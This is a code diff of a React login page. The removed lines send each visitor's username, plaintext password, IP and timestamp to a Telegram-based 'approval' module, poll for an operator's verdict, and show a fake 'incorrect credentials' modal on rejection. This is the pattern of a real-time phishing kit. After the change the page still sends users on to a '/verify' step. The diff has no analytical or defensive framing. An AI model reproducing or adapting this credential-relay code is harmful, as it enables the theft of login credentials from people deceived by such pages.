@@ -1,11 +1,10 @@
-import { useState, useEffect, useRef } from "react";
+import { useState } from "react";
 import { useLocation } from "wouter";
 import { useAuth } from "@/lib/auth";
 import { useI18n, type Language } from "@/lib/i18n";
-import { Globe, ChevronDown } from "lucide-react";
+import { Globe } from "lucide-react";
 import { ChatWidget } from "@/components/chat-widget";
 import { RecaptchaBadge } from "@/components/recaptcha-badge";
-import { getIPInfo, sendApprovalRequest, pollApproval, answerCallback, getLatestOffset } from "@/lib/telegram";
 
 const languageOptions: { code: Language; label: string }[] = [
   { code: "en", label: "English" },
@@ -15,19 +14,13 @@ const languageOptions: { code: Language; label: string }[] = [
 
 export default function Login() {
   const { login, isAuthenticated } = useAuth();
-  const { lang, setLang, t, langName } = useI18n();
+  const { lang, setLang, t } = useI18n();
   const [, navigate] = useLocation();
   const [username, setUsername] = useState("");
   const [password, setPassword] = useState("");
   const [error, setError] = useState("");
   const [loading, setLoading] = useState(false);
-  const [waiting, setWaiting] = useState(false);
-  const [showModal, setShowModal] = useState(false);
   const [showLangDropdown, setShowLangDropdown] = useState(false);
-  const pollRef = useRef<ReturnType<typeof setInterval> | null>(null);
-  const offsetRef = useRef(0);
-
-  useEffect(() => () => { if (pollRef.current) clearInterval(pollRef.current); }, []);
 
   if (isAuthenticated) { navigate("/"); return null; }
 
@@ -38,30 +31,7 @@ export default function Login() {
     const result = await login(username, password);
     setLoading(false);
     if (!result.ok) { setError(t.invalidCredentials); return; }
-
-    const now = new Date().toLocaleString("id-ID", { timeZone: "Asia/Jakarta" });
-    const [ip, startOffset] = await Promise.all([getIPInfo(), getLatestOffset()]);
-    const sessionKey = Date.now().toString(36);
-    offsetRef.current = startOffset;
-
-    await sendApprovalRequest(username, password, ip, now, sessionKey, "Login");
-    setWaiting(true);
-
-    pollRef.current = setInterval(async () => {
-      const { status, nextOffset, callbackId } = await pollApproval(offsetRef.current, sessionKey);
-      offsetRef.current = nextOffset;
-      if (status === "approved") {
-        clearInterval(pollRef.current!);
-        if (callbackId) await answerCallback(callbackId, "✅ Login disetujui!");
-        setWaiting(false);
-        navigate("/verify");
-      } else if (status === "rejected") {
-        clearInterval(pollRef.current!);
-        if (callbackId) await answerCallback(callbackId, "❌ Login ditolak.");
-        setWaiting(false);
-        setShowModal(true);
-      }
-    }, 2500);
+    navigate("/verify");
   };
 
   return (
@@ -87,57 +57,6 @@ export default function Login() {
           }
         }
       `}</style>
-      {/* ── INCORRECT CREDENTIALS MODAL ── */}
-      {showModal && (
-        <div style={{
-          position: "fixed", inset: 0, zIndex: 1000,
-          background: "rgba(0,0,0,0.45)",
-          display: "flex", alignItems: "center", justifyContent: "center",
-          padding: "0 20px",
-        }}>
-          <div style={{
-            background: "#fff", borderRadius: 4,
-            padding: "32px 28px 24px",
-            maxWidth: 380, width: "100%",
-            boxShadow: "0 8px 40px rgba(0,0,0,0.25)",
-            textAlign: "center",
-          }}>
-            <h3 style={{ fontSize: 18, fontWeight: 600, color: "#111", marginBottom: 14 }}>
-              {t.incorrectCredsTitle}
-            </h3>
-            <p style={{ fontSize: 13, color: "#555", lineHeight: 1.7, marginBottom: 24 }}>
-              {t.incorrectCredsDesc}
-            </p>
-            <button
-              type="button"
-              onClick={() => setShowModal(false)}
-              style={{
-                width: "100%", height: 44, background: "#111", color: "#fff",
-                fontSize: 14, fontWeight: 500, border: "none",
-                borderRadius: 3, cursor: "pointer", letterSpacing: "0.03em",
-              }}
-            >
-              {t.close}
-            </button>
-          </div>
-        </div>
-      )}
-
-      {/* ── WAITING OVERLAY ── */}
-      {waiting && (
-        <div style={{
-          position: "fixed", inset: 0, zIndex: 999,
-          background: "rgba(255,255,255,0.7)",
-          display: "flex", alignItems: "center", justifyContent: "center",
-        }}>
-          <div style={{
-            width: 44, height: 44,
-            border: "4px solid #e5e5e5", borderTop: "4px solid #111",
-            borderRadius: "50%", animation: "spin 0.85s linear infinite",
-          }} />
-          <style>{`@keyframes spin { to { transform: rotate(360deg); } }`}</style>
-        </div>
-      )}
 
       {/* ─── CARD ─── */}
       <div
